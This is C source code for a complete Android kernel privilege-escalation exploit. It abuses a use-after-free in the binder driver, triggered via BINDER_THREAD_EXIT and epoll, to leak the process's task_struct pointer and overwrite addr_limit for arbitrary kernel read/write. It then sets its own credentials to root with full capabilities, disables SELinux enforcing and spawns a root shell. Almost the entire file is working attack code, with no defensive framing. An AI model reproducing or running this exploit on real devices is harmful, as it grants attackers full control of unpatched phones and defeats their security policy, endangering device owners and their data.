
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdint.h>
#include <sched.h>
#include <ctype.h>

// global 
void *dummy_page;
static char pipe_read_buffer[PAGE_SIZE] = {0};
int nBytesRead = 0, nBytesWritten, binder_fd, epoll_fd, pipe_fd[2];
uint64_t task_struct_kptr, task_pid_kptr, task_cred_kptr, task_init_nsproxy_kptr, cred_kptr, init_nsproxy_kptr, kbase;
struct epoll_event event = {.events = EPOLLIN};
int krw_pipe[2];



/**
 * Defines
 */
#define BINDER_THREAD_EXIT 0x40046208ul
#define OFFSET_TASK_STRUCT_ADDR_LIMIT 0xA18
#define IOVEC_SIZE 25
#define READ_PIPE pipe_fd[0]
#define WRITE_PIPE pipe_fd[1]

#define CRED_UID_OFFSET 0x4
#define CRED_GID_OFFSET 0x8
#define CRED_SUID_OFFSET 0xC
#define CRED_SGID_OFFSET 0x10
#define CRED_EUID_OFFSET 0x14
#define CRED_EGID_OFFSET 0x18
#define CRED_FSUID_OFFSET 0x1C
#define CRED_FSGID_OFFSET 0x20
#define CRED_SECUREBITS_OFFSET 0x24
#define CRED_CAP_INHERITABLE_OFFSET 0x28
#define CRED_CAP_PERMITTED_OFFSET 0x30
#define CRED_CAP_EFFECTIVE_OFFSET 0x38
#define CRED_CAP_BSET_OFFSET 0x40
#define CRED_CAP_AMBIENT_OFFSET 0x48

#define GLOBAL_ROOT_UID 0
#define GLOBAL_ROOT_GID 0
#define SECUREBITS_DEFAULT 0x00000000
#define CAP_EMPTY_SET 0
#define CAP_FULL_SET 0x3FFFFFFFFF


/* index equivalent to the iovec which overlaps the wait struct */
#define IOVEC_OVERLAP_INDEX 10

/**
 * @brief dump memory
 * 
 */
void hexdump_memory(unsigned char *buf, size_t byte_count) {
    unsigned long byte_offset_start = 0;
    if (byte_count % 16) {
        return ;
    }

    for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count; byte_offset += 16) {
        char line[1000];
        char *linep = line;
        linep += sprintf(linep, "%08lx   ", byte_offset);
        for (int i = 0; i < 16; i++) {
            linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
        }

        linep += sprintf(linep, "  |");
        for (int i = 0; i < 16; i++) {
            char c = buf[byte_offset + i];
            if (isalnum(c) || ispunct(c) || c == ' ') {
                *(linep++) = c;
            } else {
                *(linep++) = '.';
            }
        }
        linep += sprintf(linep, "|");
        puts(line);
    }
}

/**
 * @brief Read from arbitrary address.
 * 
 * @param address : address from where to read
 * @param length : how much to read
 * @param buffer : output user buffer
 */
void kRead(void* address, size_t length, void* buffer) {
    nBytesWritten = write(krw_pipe[1], address, length);
    if ((size_t) nBytesWritten != length) {
        printf("[-] Failed to write data from kernel: %p", address);
        exit(EXIT_FAILURE);
    }

    nBytesRead = read(krw_pipe[0], buffer, length);
    if ((size_t) nBytesRead != length) {
        printf("[-] Failed to read data from kernel: %p", address);
        exit(EXIT_FAILURE);
    }
}

void spawnShell() {
    // verify if rooted
    printf("[+] Verifying if rooted.\n");
    uid_t uid = getuid();
    printf("\t[*] uid: 0x%x.\n", uid);

    if (uid != 0) {
        printf("\t[[-] rooting failed. have a break and try again~.\n");
    } else {
        printf("\t[*] Congrac. YOU GOT ROOT!\n");
    }

    printf("[+] Spawning root shell.\n");
    system("/bin/sh");
}

/**
 * @brief Write to arbitrary address.
 * 
 * @param address : address where to write.
 * @param length : how much to write.
 * @param buffer : input user buffer.
 */
void kWrite(void* address, size_t length, void* buffer) {
    nBytesWritten = write(krw_pipe[1], buffer, length);
    if ((size_t) nBytesWritten != length) {
        printf("[-] Failed to write data from user : %p", address);
        exit(EXIT_FAILURE);
    }

    nBytesRead = read(krw_pipe[0], address, length);
    if ((size_t) nBytesRead != length) {
        printf("[-] Failed to write data to kernel : %p", address);
        exit(EXIT_FAILURE);
    }
}

uint64_t kReadQword(void *address) {
    uint64_t buffer = 0;

    kRead(address, sizeof(buffer), &buffer);
    return buffer;
}

uint32_t kReadDword(void *address) {
    uint32_t buffer = 0;

    kRead(address, sizeof(buffer), &buffer);
    return buffer;
}

void kWriteQword(void *address, uint64_t value) {
    kWrite(address, sizeof(value), &value);
}

void kWriteDword(void *address, uint32_t value) {
    kWrite(address, sizeof(value), &value);
}

/**
 * @brief Bind to CPU
 * 
 * It's a good thing to bind the CPU to a specific core
 */
void bindToCPU() {
    int ret;
    cpu_set_t cpuSet;

    CPU_ZERO(&cpuSet);
    CPU_SET(0, &cpuSet);

    printf("[+] Bind to 0th core.\n");

    ret = sched_setaffinity(0, sizeof(cpu_set_t), &cpuSet);

    if (ret < 0) {
        printf("[-] bind CPU failed: 0x%x\n", errno);
    }
}

void leakTaskStruct() {
    struct iovec iovec_stack[IOVEC_SIZE] = {nullptr};

    /* step1 [vuln init] : 
     *  open the binder device
     *  create epoll
     *  link epoll     
     */
    printf("[+] Open /dev/binder\n");
    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) {
        printf("[-] Error : open binder driver failed.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t [*] binder_fd -> 0x%x\n", binder_fd);
    }

    printf("[+] Creating epoll\n");
    epoll_fd = epoll_create(0x41);
    if (epoll_fd < 0) {
        printf("[-] Error : create epoll fd failed.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t [*] create epoll fd succeed at 0x%x\n", epoll_fd);
    }

    printf("[+] Linking epoll\n");
    epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event);

    /**
     * step2 [pipe and iovec init]
     * 
     */
    printf("[+] Setting pipe");
    if (pipe(pipe_fd) == -1) {
        printf("\t[-] Error : unable to create pipe.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] create pipe successfully.\n");
    }

    printf("[+] Reducing the size of pipe to PAGE_SIZE.\n");
    if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) == -1) {
        printf("\t[-] Error : unable to change the pipe capacity.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] change the size of pipe success.\n");
    }

    printf("[+] Setting up iovecs\n");
    dummy_page = mmap((void *) 0x100000000ul, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (!dummy_page) {
        printf("\t[-] Error : unable to mmap 4GB aligned page\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] Mapped page : %p\n", dummy_page);
    }

    iovec_stack[IOVEC_OVERLAP_INDEX].iov_base = dummy_page;
    iovec_stack[IOVEC_OVERLAP_INDEX].iov_len = PAGE_SIZE;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_base = (void *) 0x41414141;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;

    /**
     * step 3 : [trigge UAF and leak data at binder_thread + 0xa8]
     * 
     */
    pid_t child = fork();

    if (child == 0) {
        // child process
        sleep(2);
        printf("[+] Child process is weaking up and run.\n");

        // writes a kernel pointer to binder_thread->wait.head to
        // binder_thread->wait.head.next and binder_thread->wait.head.prev
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);

        // reading funk data
        nBytesRead = read(pipe_fd[0], pipe_read_buffer, sizeof(pipe_read_buffer));
        if (nBytesRead != PAGE_SIZE) {
            printf("\t[-] CHILD Error : read failed. nBytesRead : 0x%lx, expected : 0x%x\n", nBytesRead, PAGE_SIZE);
            exit(EXIT_FAILURE);
        }

        exit(EXIT_SUCCESS);
    }

    // parent process
    // trigge binder_thread free
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    nBytesWritten = writev(pipe_fd[1], iovec_stack, IOVEC_SIZE);
    if (nBytesWritten != PAGE_SIZE * 2) {
        printf("\t[-] Error : writev failed. nByteWritten : 0x%lx, expected: 0x:%x", nBytesWritten, PAGE_SIZE*2);
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] wrote 0x%lx bytes\n", nBytesWritten);
    }

    // useful kernel pointer leak here;
    nBytesRead = read(pipe_fd[0], pipe_read_buffer, sizeof(pipe_read_buffer));
    if (nBytesRead != PAGE_SIZE) {
        printf("\t[-] Error : read failed. nBytesRead: 0x%lx, excepted: 0x%x\n", nBytesRead, PAGE_SIZE);
        exit(EXIT_FAILURE);
    }

    // wait for child process to exit.
    wait(nullptr);

    // hexdump_memory((unsigned char *) pipe_read_buffer, sizeof(pipe_read_buffer));

    task_struct_kptr = *(uint64_t *)(pipe_read_buffer + 0xE8);
    /**
     * @brief #define PIPE_READ_KPTR_OFFSET 0xE8
            #define TASK_STRUCT_PID_OFFSET 0x4E8
            #define TASK_STRUCT_CRED_OFFSET 0x688
     * 
     */
    task_pid_kptr = task_struct_kptr + 0x4E8;
    task_cred_kptr = task_struct_kptr + 0x688;
    task_init_nsproxy_kptr = task_struct_kptr + 0x6C0;

    printf("\t[+] leaked task_struct kernel pointer: 0x%lx\n", task_struct_kptr);
    printf("\t[+] task_struct->pid @ 0x%lx\n", task_pid_kptr);
    printf("\t[+] task_struct->cred @ 0x%lx\n", task_cred_kptr);
    printf("\t[+] task_struct->init_nsproxy @ 0x%lx\n", task_init_nsproxy_kptr);
}

void patchAddrLimit() {
    int sock_fd[2] = {0};
    struct msghdr message = {nullptr};
    struct iovec  iovec_stack[IOVEC_SIZE] = {nullptr};

    /**
     * step 1 : vuln init as usual
     * 
     */
    printf("[+] Opening : /dev/binder again.\n");
    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) {
        printf("\t[-] unable to open binder driver.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] binder fd : 0x%x.\n", binder_fd);
    }

    printf("[+] Creating event poll.\n");
    epoll_fd = epoll_create(0x41);
    if (epoll_fd < 0) {
        printf("\t[-] unable to create epoll.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] epoll fd : 0x%x.\n", epoll_fd);
    }

    /**
     * step 2: create a socketpair for write primitive
     * 
     */
    printf("[+] Setting up socket.\n");
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) == -1) {
        printf("\t[-] unable to create socket pair.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] socketpair created successfully.\n");
    }

    /* garbage data */
    static char garbage_data[] = { 0x41 };
    printf("[+] write garbage data to socket.\n");
    nBytesWritten = write(sock_fd[1], &garbage_data, sizeof(garbage_data));
    if (nBytesWritten != sizeof(garbage_data)) {
        printf("\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx.\n", nBytesWritten, sizeof(garbage_data));
        exit(EXIT_FAILURE);
    }

    /**
     *  step 3 : construct hijacking data \
     *       and init iovecs
     */
    printf("[+] Setting up iovecs.\n");

    iovec_stack[IOVEC_OVERLAP_INDEX].iov_base = dummy_page;
    iovec_stack[IOVEC_OVERLAP_INDEX].iov_len = 1;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_base = (void*)0x41414141;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8;
    iovec_stack[IOVEC_OVERLAP_INDEX + 2].iov_base = (void*)0x42424242;
    iovec_stack[IOVEC_OVERLAP_INDEX + 2].iov_len = 0x8;

    static uint64_t final_socket_data[] = {
        0x1,                                 // iovec_stack[IOVEC_SIZE].iov_len
        0x41414141,                         // iovec_stack[IOVEC_SIZE + 1].iov_base
        0x8 + 0x8 + 0x8 + 0x8,              // iovec_stack[IOVEC_SIZE + 1].iov_len
        (uint64_t) ((uint8_t *) task_struct_kptr + OFFSET_TASK_STRUCT_ADDR_LIMIT),     // iovec_stack[IOVEC_SIZE + 2].iov_base
        0xFFFFFFFFFFFFFFFE                 // addr_limit value
    };

    /* prepare the message */
    message.msg_iov = iovec_stack;
    message.msg_iovlen = IOVEC_SIZE;
    
    /**
     * step 4: trigging the Vuln and clobber addr_limit
     * 
     */
    printf("[+] Linking epoll\n");
    epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event);

    pid_t child = fork();
    if (child == 0) {
        /* child process */
        sleep(2);

        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);

        // write rest of the data to socket, so that recvmsg resume.
        nBytesWritten = write(sock_fd[1], final_socket_data, sizeof(final_socket_data));

        if (nBytesWritten != sizeof(final_socket_data)) {
            printf("\t[-] write failed. nBytesWriten : 0x%lx, excepted: 0x%lx.\n", nBytesWritten, sizeof(final_socket_data));
            exit(EXIT_FAILURE);
        }

        exit(EXIT_SUCCESS);
    }

    // parent process
    // trigge binder_thread free
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    // the MSG_WAITALL flag could cause a block. waiting for child process write `final_socket_data` into iovec;
    ssize_t nBytesReceived = recvmsg(sock_fd[0], &message, MSG_WAITALL);

    ssize_t expected_received_size = iovec_stack[IOVEC_OVERLAP_INDEX].iov_len + iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_len + iovec_stack[IOVEC_OVERLAP_INDEX + 2].iov_len;
    if (nBytesReceived != expected_received_size) {
        printf("\t[-] recvmsg failed. nBytesReceived : 0x%lx, expected : 0x%lx.\n", nBytesRead, expected_received_size);
        exit(EXIT_FAILURE);
    }

    wait(nullptr);
}

void patchKernelCred() {
    // step 1 : prepare pipes for stable r/w
    if (pipe(krw_pipe)) {
        printf("\t[-] failed to create pipes for stable r/w.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[+] created the pipes for stable r/w successfully.\n");
    }

    // step 2 : test for arbitrary r/w [It does not matter if you skip this step]
    pid_t current_pid = getpid();
    pid_t expected_pid = 0;

    expected_pid = kReadQword((void*)task_pid_kptr);

    printf("\t[*] current pid : %d.\n",current_pid);
    printf("\t[*] expected pid : %d.\n", expected_pid);

    if (current_pid != expected_pid) {
        printf("\t[-] arbitrary read/write failed.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[-] arbitrary read/write successful.\n");
    }

    // step 3 : patch kernel cred
    printf("[+] reading cred pointer from task_struct.\n");
    cred_kptr = kReadQword((void*)task_cred_kptr);

    kWriteDword((void*)(cred_kptr + CRED_UID_OFFSET), GLOBAL_ROOT_UID);
    kWriteDword((void*)(cred_kptr + CRED_GID_OFFSET), GLOBAL_ROOT_GID);
    kWriteDword((void*)(cred_kptr + CRED_SUID_OFFSET), GLOBAL_ROOT_UID);
    kWriteDword((void*)(cred_kptr + CRED_SGID_OFFSET), GLOBAL_ROOT_GID);
    kWriteDword((void*)(cred_kptr + CRED_EUID_OFFSET), GLOBAL_ROOT_UID);
    kWriteDword((void*)(cred_kptr + CRED_EGID_OFFSET), GLOBAL_ROOT_GID);
    kWriteDword((void*)(cred_kptr + CRED_FSUID_OFFSET), GLOBAL_ROOT_UID);
    kWriteDword((void*)(cred_kptr + CRED_FSGID_OFFSET), GLOBAL_ROOT_GID);
    kWriteDword((void*)(cred_kptr + CRED_SECUREBITS_OFFSET), SECUREBITS_DEFAULT);
    kWriteQword((void*)(cred_kptr + CRED_CAP_INHERITABLE_OFFSET), CAP_EMPTY_SET);
    kWriteQword((void*)(cred_kptr + CRED_CAP_PERMITTED_OFFSET), CAP_FULL_SET);
    kWriteQword((void*)(cred_kptr + CRED_CAP_EFFECTIVE_OFFSET), CAP_FULL_SET);
    kWriteQword((void*)(cred_kptr + CRED_CAP_BSET_OFFSET), CAP_FULL_SET);
    kWriteQword((void*)(cred_kptr + CRED_CAP_AMBIENT_OFFSET), CAP_EMPTY_SET);
}

void disableSELinuxEnforcing() {
    // check if selinux enforcing is enabled
    printf("[+] reading init_nsproxy pointer from task_struct.\n");
    init_nsproxy_kptr = kReadQword((void*)task_init_nsproxy_kptr);

    kbase = init_nsproxy_kptr - 0x1233800;
    printf("\t[+] kernel base : 0x%lx\n", kbase);

    uint64_t selinux_enforcing_kptr = kbase + 0x14AA000;
    int ret = kReadDword((void*)selinux_enforcing_kptr);
    if (ret && ret != -1) {
        printf("\t[+] SELinux enforcing is enabled.\n");
        kWriteDword((void*)selinux_enforcing_kptr, 0x0);
        printf("\t[+] successfully disabled SELinux enforcing.\n");
    } else if(ret == 0) {
        printf("\t[+] SELinux enforcing is disabled.\n");
    }
}

int main() {
    bindToCPU();
    leakTaskStruct();
    patchAddrLimit();
    patchKernelCred();
    disableSELinuxEnforcing();
    spawnShell();

    return EXIT_SUCCESS;
}